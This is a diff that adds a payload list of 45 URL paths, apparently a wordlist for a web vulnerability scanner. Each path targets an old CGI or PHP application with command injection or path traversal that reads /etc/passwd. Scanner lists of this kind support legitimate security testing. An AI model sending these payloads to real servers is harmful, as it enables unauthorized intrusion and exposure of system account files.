@@ -1,0 +1,45 @@
+cgi-bin/gbook/gbook.cgi?_MAILTO=xx;cat%20/etc/passwd
+cgi-bin/bslist.cgi?email=x;cat%20/etc/passwd
+cgi-bin/bsguest.cgi?email=x;cat%20/etc/passwd
+cgi-bin/pollit/Poll_It_SSI_v2.0.cgi?data_dir=\\etc\\passwd%00
+cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
+cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
+cgi-bin/af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
+cgi-bin/alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
+cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
+cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
+logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
+cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd|
+cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
+cgi-bin/common/listrec.pl?APP=qmh-news&TEMPLATE=;cat%20/etc/passwd|
+cgi-bin/smartsearch.cgi?keywords=|cat%20/etc/passwd|
+cgi-bin/smartsearch/smartsearch.cgi?keywords=|cat%20/etc/passwd|
+cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download
+mods/apage/apage.cgi?f=file.htm.|cat /etc/passwd|
+cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;cat%20/etc/passwd|&CODE=PHOLD
+cgi-bin/dose.pl?daily&somefile.txt&|cat /etc/passwd|
+shop/normal_html.cgi?file=;cat%20/etc/passwd|
+shop/normal_html.cgi?file=|cat%20/etc/passwd|
+index.php?option=com_search&Itemid=1&searchword=%22%3Bsystem(cat%20/etc/passwd)%3B
+shop/member_html.cgi?file=;cat%20/etc/passwd|
+shop/member_html.cgi?file=|cat%20/etc/passwd|
+cgi-bin/FileSeek.cgi?head=;cat%20/etc/passwd|&foot=
+cgi-bin/FileSeek2.cgi?head=;cat%20/etc/passwd|&foot=
+cgi-bin/guestbook.cgi?user=cpanel&template=|cat%20/etc/passwd|
+cgi-bin/shop.pl/page=;cat%20/etc/passwd|
+cgi-bin/shopplus.cgi?dn=domainNikto.com&cartid=%CARTID%&file=;cat%20/etc/passwd|
+cgi-bin/shopplus.cgi?dn=domainname.com&cartid=%CARTID%&file=;cat%20/etc/passwd|
+cgi-bin/eshop.pl/seite=;cat%20/etc/passwd|
+cgi-bin/FileSeek.cgi?head=&foot=;cat%20/etc/passwd
+cgi-bin/FileSeek2.cgi?head=&foot=;cat%20/etc/passwd
+cgi-bin/csSearch.cgi?command=savesetup&setup=`cat%20/etc/passwd`
+cgi-bin/csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
+cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
+cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
+cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
+perl/-e%20%22system('cat%20/etc/passwd');\\%22
+cgi-bin/pfdispaly.cgi?'%0A/bin/cat%20/etc/passwd|'
+cgi-bin/pfdisplay.cgi?'%0A/bin/cat%20/etc/passwd|'
+gravity/library/setup/rpc.php?objectname=system("cat%20/etc/passwd");die
+cgi-bin/htmpl_admin.cgi?help=|cat /etc/passwd
+moodle/filter/tex/texed.php?formdata=foo&pathname=foo";cat+/etc/passwd;echo+"
